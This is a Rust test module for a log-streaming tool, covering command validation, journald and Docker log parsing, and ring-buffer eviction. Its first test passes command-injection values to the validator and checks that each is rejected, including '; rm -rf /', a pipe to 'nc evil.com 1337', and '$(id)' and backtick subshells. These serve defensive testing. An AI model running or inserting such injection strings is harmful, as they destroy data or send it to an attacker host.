#[cfg(test)]
mod tests {
    use crate::core::source::LogSource;
    use crate::core::stream::command::{validate_safe_argument, StreamTemplate};
    use crate::core::stream::docker::{DockerLogParser, DockerStreamType};
    use crate::core::stream::journald::JournaldJsonParser;
    use crate::core::stream::storage::BoundedStreamStorage;

    #[test]
    fn test_stream_command_validation_and_injection_immunity() {
        // Safe command
        let t1 = StreamTemplate::TailFollow {
            path: "/var/log/nginx/access.log".to_string(),
            lines: Some(100),
        };
        let cmd = t1.build_command().expect("Build safe tail command");
        assert_eq!(cmd, "tail -F -n 100 /var/log/nginx/access.log");

        // Command injection attempt 1: semicolon chaining
        let t_evil1 = StreamTemplate::TailFollow {
            path: "/var/log/app.log; rm -rf /".to_string(),
            lines: None,
        };
        assert!(t_evil1.build_command().is_err());

        // Command injection attempt 2: pipe operator
        let t_evil2 = StreamTemplate::DockerLogs {
            container: "web | nc evil.com 1337".to_string(),
            timestamps: true,
            tail: None,
        };
        assert!(t_evil2.build_command().is_err());

        // Command injection attempt 3: subshell expansion $()
        assert!(validate_safe_argument("nginx$(id)").is_err());
        assert!(validate_safe_argument("app`whoami`").is_err());
        assert!(validate_safe_argument("log&&curl").is_err());
    }

    #[test]
    fn test_journald_json_parser_and_cursor() {
        let sample = r#"{"MESSAGE":"Worker process started successfully","PRIORITY":"6","_SYSTEMD_UNIT":"web.service","_PID":"4092","__REALTIME_TIMESTAMP":"1700000000123456","__CURSOR":"s=abc123cursor456"}"#;
        let record = JournaldJsonParser::parse_line(sample).expect("Parse journald");

        assert_eq!(record.message, "Worker process started successfully");
        assert_eq!(record.priority, 6);
        assert_eq!(record.unit.as_deref(), Some("web.service"));
        assert_eq!(record.pid, Some(4092));
        assert_eq!(record.cursor.as_deref(), Some("s=abc123cursor456"));

        let display = record.format_display();
        assert!(display.contains("[INFO]"));
        assert!(display.contains("[web.service]"));
        assert!(display.contains("[PID:4092]"));
        assert!(display.contains("Worker process started successfully"));
    }

    #[test]
    fn test_docker_logs_parser() {
        let sample =
            "2026-11-25T10:15:30.123456789Z Container healthy and serving HTTP on port 8080";
        let record = DockerLogParser::parse_line(sample);

        assert_eq!(record.stream_type, DockerStreamType::Stdout);
        assert_eq!(
            record.timestamp.as_deref(),
            Some("2026-11-25T10:15:30.123456789Z")
        );
        assert_eq!(
            record.message,
            "Container healthy and serving HTTP on port 8080"
        );

        let display = record.format_display();
        assert!(display.contains("[STDOUT]"));
        assert!(display.contains("serving HTTP on port 8080"));
    }

    #[test]
    fn test_bounded_stream_storage_ring_buffer_eviction() {
        let mut storage = BoundedStreamStorage::new("srv1", "tail-follow", 3);
        assert_eq!(storage.line_count(), 0);
        assert!(!storage.is_history_evicted());

        storage.append_line("Event 1");
        storage.append_line("Event 2");
        storage.append_line("Event 3");
        assert_eq!(storage.line_count(), 3);
        assert!(!storage.is_history_evicted());
        assert_eq!(storage.get_line(0).unwrap(), "Event 1");

        // Bookmark Event 2 (index 1)
        storage.toggle_bookmark(1);
        assert!(storage.is_bookmarked(1));

        // Append 4th item: should evict Event 1 (FIFO)
        storage.append_line("Event 4");
        assert_eq!(storage.line_count(), 3);
        assert!(storage.is_history_evicted());
        assert_eq!(storage.total_lines_received(), 4);
        assert_eq!(storage.get_line(0).unwrap(), "Event 2");
        assert_eq!(storage.get_line(2).unwrap(), "Event 4");

        // Bookmark should have shifted from index 1 to index 0
        assert!(storage.is_bookmarked(0));
    }
}
